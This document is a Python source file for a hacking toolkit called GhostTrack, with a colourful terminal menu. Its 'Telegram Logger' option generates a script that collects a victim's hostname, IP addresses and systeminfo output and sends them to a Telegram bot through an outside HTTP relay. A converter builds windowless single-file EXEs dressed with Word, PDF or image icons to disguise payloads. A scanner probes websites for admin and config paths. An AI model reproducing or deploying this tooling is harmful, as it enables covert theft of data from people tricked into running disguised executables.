import os
import time
import socket
import requests
import platform
import subprocess
import shutil
from sys import stdout
from colorama import Fore, init

# Initialize colorama
init()

# Animation Functions
def ghost_typewriter(text, delay=0.03, color=Fore.LIGHTCYAN_EX, new_line=True):
    for char in text:
        stdout.write(color + char)
        stdout.flush()
        time.sleep(delay)
    if new_line:
        print()

def ghost_spinner(duration=1.0):
    spinner_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end_time = time.time() + duration
    while time.time() < end_time:
        for frame in spinner_frames:
            if time.time() >= end_time:
                break
            print(Fore.LIGHTMAGENTA_EX + f"\r{frame} Processing...", end="")
            time.sleep(0.1)
    print("\r", end="")

def ghost_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = r"""
   ________              __   ___________ __ __             
  / ____/ /_  ___  _____/ /__/ ____/ ___// /_/ /____  _____
 / / __/ __ \/ _ \/ ___/ //_/ /_   \__ \/ __/ __/ _ \/ ___/
/ /_/ / / / /  __/ /__/ ,< / __/  ___/ / /_/ /_/  __/ /    
\____/_/ /_/\___/\___/_/|_/_/    /____/\__/\__/\___/_/     
    """
    ghost_typewriter(logo, 0.01)
    subtitle = "            -=[ Ghosttrack ]=-"
    ghost_typewriter(subtitle, 0.02, Fore.LIGHTRED_EX)
    ghost_spinner(1.0)
    print("\n")
    

# EXE Conversion Function
def convert_to_exe():
    ghost_typewriter("\nPython to EXE Converter", 0.03, Fore.LIGHTYELLOW_EX)
    python_file = input(Fore.LIGHTYELLOW_EX + "Enter Python file path: " + Fore.RESET).strip('"')

    if not os.path.exists(python_file):
        ghost_typewriter("File not found!", 0.03, Fore.LIGHTRED_EX)
        return

    default_name = os.path.basename(python_file).replace('.py', '')
    output_name = input(Fore.LIGHTYELLOW_EX + f"Enter output EXE name [{default_name}]: " + Fore.RESET)
    output_name = output_name if output_name else default_name

    ghost_typewriter("\nAvailable icons:", 0.03, Fore.LIGHTYELLOW_EX)
    icons = {
        '1': ('Word Icon', 'word.ico'),
        '2': ('PDF Icon', 'pdf.ico'),
        '3': ('Image Icon', 'image.ico'),
        '4': ('Default Icon', 'default.ico'),
        '5': ('Custom Icon', None)
    }

    for key, (desc, _) in icons.items():
        ghost_typewriter(f"[{key}] {desc}", 0.03, Fore.LIGHTWHITE_EX)

    icon_choice = input(Fore.LIGHTYELLOW_EX + "Select icon (1-5): " + Fore.RESET)
    icon_path = ""

    if icon_choice in ['1', '2', '3', '4']:
        icon_file = icons[icon_choice][1]
        if os.path.exists(f"icons/{icon_file}"):
            icon_path = f' --icon="icons/{icon_file}"'
            ghost_typewriter(f"Selected {icons[icon_choice][0]}", 0.03, Fore.LIGHTGREEN_EX)
        else:
            ghost_typewriter("Icon file missing! Using default.", 0.03, Fore.LIGHTRED_EX)
            icon_path = ' --icon="icons/default.ico"'
    elif icon_choice == '5':
        custom_icon = input(Fore.LIGHTYELLOW_EX + "Enter custom .ico file path: " + Fore.RESET).strip('"')
        if os.path.exists(custom_icon) and custom_icon.endswith('.ico'):
            icon_path = f' --icon="{custom_icon}"'
            ghost_typewriter("Custom icon selected!", 0.03, Fore.LIGHTGREEN_EX)
        else:
            ghost_typewriter("Invalid .ico file! Using default.", 0.03, Fore.LIGHTRED_EX)
            icon_path = ' --icon="icons/default.ico"'
    else:
        ghost_typewriter("Invalid choice! Using default icon.", 0.03, Fore.LIGHTRED_EX)
        icon_path = ' --icon="icons/default.ico"'

    ghost_typewriter("\nEXE Type Options:", 0.03, Fore.LIGHTYELLOW_EX)
    exe_types = {
        '1': ('Single File (No Console)', '--onefile --noconsole'),
        '2': ('Single File (With Console)', '--onefile')
    }

    for key, (desc, _) in exe_types.items():
        ghost_typewriter(f"[{key}] {desc}", 0.03, Fore.LIGHTWHITE_EX)

    exe_type = input(Fore.LIGHTYELLOW_EX + "Select option (1-2): " + Fore.RESET)
    type_flag = exe_types.get(exe_type, ('Single File (No Console)', '--onefile --noconsole'))[1]

    command = f'pyinstaller --noconfirm {type_flag}{icon_path} --name "{output_name}" "{python_file}"'

    try:
        ghost_typewriter("\nConverting with selected options...", 0.03, Fore.LIGHTMAGENTA_EX)
        ghost_spinner(2.0)

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout_data, stderr_data = process.communicate()

        if process.returncode == 0:
            output_dir = "GhostTrack_EXE_Output"
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)

            src = os.path.join('dist', f'{output_name}.exe')
            dest = os.path.join(output_dir, f'{output_name}.exe')

            if os.path.exists(src):
                shutil.move(src, dest)
                shutil.rmtree('build', ignore_errors=True)
                shutil.rmtree('dist', ignore_errors=True)
                spec_file = f'{output_name}.spec'
                if os.path.exists(spec_file):
                    os.remove(spec_file)

                ghost_typewriter(f"\nEXE file created at: {dest}", 0.03, Fore.LIGHTGREEN_EX)
                ghost_typewriter(f"File name: {output_name}.exe", 0.03, Fore.LIGHTBLUE_EX)
                ghost_typewriter(f"Icon used: {icons.get(icon_choice, ('Default',))[0]}", 0.03, Fore.LIGHTBLUE_EX)
                ghost_typewriter("Conversion completed successfully!", 0.03, Fore.LIGHTGREEN_EX)
            else:
                ghost_typewriter("\nEXE file not generated!", 0.03, Fore.LIGHTRED_EX)
        else:
            ghost_typewriter("\nConversion failed with errors:", 0.03, Fore.LIGHTRED_EX)
            ghost_typewriter(stderr_data.decode(), 0.01, Fore.LIGHTRED_EX)

    except Exception as e:
        ghost_typewriter(f"\nError: {str(e)}", 0.03, Fore.LIGHTRED_EX)

    input("\nPress Enter to continue...")

def main():
    while True:
        try:
            ghost_header()

            host_name = socket.gethostname()
            local_ip = socket.gethostbyname(host_name)
            public_ip = requests.get("https://api.ipify.org").text
            system_name = platform.uname()[0]
            system_node = platform.uname()[2]
            user_name = os.getlogin()
            Model = platform.uname()[4]
            devaice_name = platform.uname()[1]
            architecture = platform.architecture()
            python_version = platform.python_version()

            ghost_typewriter("\nSystem Information:", 0.02, Fore.LIGHTYELLOW_EX)
            info_lines = [
                f"User: {user_name}",
                f"OS System: {devaice_name}",
                f"OS Architecture: {architecture}"
                f"OS Model: {Model}",
                f"OS System: {system_name}",
                f"OS Release: {system_node}",
                f"Python Version: {python_version}",
                f"Public IP: {public_ip}",
                f"Local IP: {local_ip}"
            ]

            for line in info_lines:
                ghost_typewriter(line, 0.01, Fore.LIGHTWHITE_EX)
                time.sleep(0.1)

            ghost_typewriter("\nMain Menu:", 0.02, Fore.LIGHTGREEN_EX)
            menu_items = [
                "[1] Create Telegram Logger",
                "[2] Web Directory Scanner",
                "[3] Convert Python to EXE",
                "[4] Exit GhostTrack"
            ]

            for item in menu_items:
                ghost_typewriter(item, 0.01, Fore.LIGHTWHITE_EX)
                time.sleep(0.05)

            print("\n")
            choice = input(Fore.LIGHTYELLOW_EX + "GhostTrack > " + Fore.RESET)

            if choice == "1":
                print("\n")
                filename = input(Fore.LIGHTYELLOW_EX + "Enter filename: " + Fore.RESET)

                if not os.path.exists("GhostTrack_Output"):
                    os.makedirs("GhostTrack_Output")

                with open(f"GhostTrack_Output/{filename}.py", "w") as f:
                    f.write("# GhostTrack Generated File\n")
                    f.write("""
import requests
import subprocess
import socket
from colorama import Fore,init

init()

hust_name = socket.gethostname()
lokal_ip =socket.gethostbyname(hust_name)

lokal = ("Your Local IP >>>"+Fore.LIGHTRED_EX+lokal_ip)
https = requests.get("https://api.ipify.org/").text


http =("Your IP Publik >>>"+Fore.LIGHTRED_EX+https)

hme = lokal+http

informtion= subprocess.getoutput("systeminfo")

a = (informtion[0:1550])
       

#add the bot url

url = "your bot token and chat id url"+str(a+hme)
               
info = { "UrlBox":url,
      "AgentList":"Mozilla Firefox",
      "VersionsList":" HTTP/1.1",
      "MethodList":"GET"
}

http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=info)
""") 


                ghost_typewriter("\nFile created successfully!", 0.03, Fore.LIGHTGREEN_EX)
                time.sleep(1.5)

            elif choice == "2":
                def web_scanner():
                    ghost_typewriter("\nWebsite Scanner:", 0.02, Fore.LIGHTYELLOW_EX)
                    url = input("Enter URL: ")
                    if not url.startswith('http'):
                        url = 'http://' + url

                    search_items = [
                        'robots.txt', 'admin/', 'login/', 
                        'wp-login.php', 'config.php''admin/',
                        'login/','sitemap.xml','sitemap2.xml','config.php',
                        'wp-login.php','log.txt','update.php','INSTALL.pgsql.txt',
                        'user/login/','INSTALL.txt','profiles/','scripts/','LICENSE.txt',
                        'CHANGELOG.txt','themes/','inculdes/','misc/','user/logout/','user/register/',
                        'cron.php','filter/tips/','comment/reply/','xmlrpc.php','modules/','install.php','MAINTAINERS.txt',
                        'user/password/','node/add/','INSTALL.sqlite.txt','UPGRADE.txt','INSTALL.mysql.txt'
                    ]

                    for item in search_items:
                        target_url = f"{url}/{item}"
                        try:
                            response = requests.get(target_url)
                            if response.status_code == 200:
                                ghost_typewriter(f"[+] Found: {target_url}", 0.01, Fore.LIGHTGREEN_EX)
                            else:
                                ghost_typewriter(f"[-] Not Found: {target_url}", 0.01, Fore.LIGHTRED_EX)
                            time.sleep(0.1)
                        except:
                            ghost_typewriter(f"[!] Error checking: {target_url}", 0.01, Fore.LIGHTYELLOW_EX)

                    input("\nPress Enter to return to menu...")

                web_scanner()

            elif choice == "3":
                convert_to_exe()

            elif choice == "4":
                ghost_typewriter("\nExiting GhostTrack...", 0.03, Fore.LIGHTMAGENTA_EX)
                time.sleep(1)
                break

            else:
                ghost_typewriter("\nInvalid option!", 0.03, Fore.LIGHTRED_EX)
                time.sleep(1)

        except KeyboardInterrupt:
            ghost_typewriter("\nOperation cancelled by user", 0.03, Fore.LIGHTYELLOW_EX)
            time.sleep(1)
            break

        except Exception as e:
            ghost_typewriter(f"\nError: {str(e)}", 0.03, Fore.LIGHTRED_EX)
            time.sleep(2)

if __name__ == "__main__":
    if not os.path.exists("icons"):
        os.makedirs("icons")
        ghost_typewriter("Created 'icons' directory. Please add your .ico files here.", 0.03, Fore.LIGHTYELLOW_EX)

    main()
 
 